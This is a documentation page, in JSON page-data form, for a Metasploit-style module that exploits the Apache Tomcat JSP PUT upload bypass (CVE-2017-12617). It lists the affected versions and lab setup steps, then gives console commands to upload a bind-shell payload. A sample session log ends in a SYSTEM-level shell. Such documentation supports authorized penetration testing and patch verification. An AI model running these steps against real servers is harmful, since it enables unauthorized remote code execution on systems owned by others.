{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/tomcat_jsp_upload_bypass","result":{"data":{"moduleMetadataJson":{"id":"5b5d9eea-b50d-5f92-b3d3-6e3b3f1fcaf1","name":"Tomcat RCE via JSP Upload Bypass","fullname":"exploit/multi/http/tomcat_jsp_upload_bypass","description":"This module uploads a jsp payload and executes it.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/tomcat_jsp_upload_bypass","documentationSlug":"/modules/documentation/exploit/multi/http/tomcat_jsp_upload_bypass","referencesSlug":"/modules/references/exploit/multi/http/tomcat_jsp_upload_bypass"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module uses a PUT request bypass to upload a jsp shell to a vulnerable Apache Tomcat configuration.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialization parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server. <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617</a></p>\n<p>To set up a vulnerable installation:</p>\n<ol>\n<li>Download and install an affected version of Apache Tomcat.</li>\n<li>Download and install Java. <a href=\"http://tomcat.apache.org/whichversion.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Choose an appropriate version</a> based on the Apache Tomcat version you downloaded.</li>\n<li>In conf directory of Apache Tomcat, edit the web.xml file and set the \"readonly\" parameter to false for the default servlet.</li>\n<li>Restart the Tomcat service.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/tomcat_jsp_upload_bypass</code></li>\n<li>Do: <code class=\"language-text\">set payload java/jsp_shell_bind_tcp</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set RPORT [PORT]</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li>It should be reported as vulnerable</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_jsp_upload_bypass \nmsf exploit(tomcat_jsp_upload_bypass) &gt; set payload java/jsp_shell_bind_tcp \npayload =&gt; java/jsp_shell_bind_tcp\nmsf exploit(tomcat_jsp_upload_bypass) &gt; set RHOST 10.10.40.93\nRHOST =&gt; 10.10.40.93\nmsf exploit(tomcat_jsp_upload_bypass) &gt; set RPORT 8080\nRPORT =&gt; 8080\nmsf exploit(tomcat_jsp_upload_bypass) &gt; check\n[+] 10.10.40.93:8080 The target is vulnerable.\nmsf exploit(tomcat_jsp_upload_bypass) &gt; run\n\n[*] Started bind handler\n[*] Uploading payload...\n[*] Payload executed!\n[*] Command shell session 1 opened (10.10.230.230:39979 -&gt; 10.10.40.93:4444) at 2017-10-11 07:43:08 -0400\n\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\Program Files\\apache-tomcat-7.0.81&gt;whoami\nwhoami\nnt authority\\system</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"5b5d9eea-b50d-5f92-b3d3-6e3b3f1fcaf1"}}}